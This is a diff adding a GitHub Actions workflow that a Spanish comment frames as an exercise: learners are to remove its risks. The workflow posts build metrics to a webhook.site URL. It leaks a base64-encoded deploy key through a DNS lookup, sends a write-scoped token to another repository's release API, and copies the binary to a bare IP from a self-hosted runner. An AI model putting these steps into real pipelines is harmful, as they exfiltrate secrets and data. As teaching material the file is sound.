@@ -1,0 +1,33 @@
+# TU TURNO (lección 11): este pipeline envía datos a sitios que no debería y
+# corre en una máquina propia en la nube sin controles. Consigue que haga lo
+# mismo (compilar, medir, comprobar y publicar) sin esos riesgos.
+name: Build
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: write
+
+jobs:
+  build:
+    runs-on: [self-hosted, gcp-large]
+    steps:
+      - name: Compilar
+        run: make build
+
+      - name: Enviar métricas
+        run: curl -s -X POST https://webhook.site/7d1c0f2a -d "@build/metrics.json"
+
+      - name: Comprobar conectividad
+        run: nslookup ZGVwbG95LWtleS0xMjM0NTY3ODkw.telemetria.example
+
+      - name: Publicar el binario
+        if: github.event_name == 'push'
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          curl -X POST -H "Authorization: Bearer $GH_TOKEN" https://api.github.com/repos/build-mirror/artefactos/releases -d '{"tag_name":"nightly"}'
+          scp build/app deploy@198.51.100.7:/srv/app
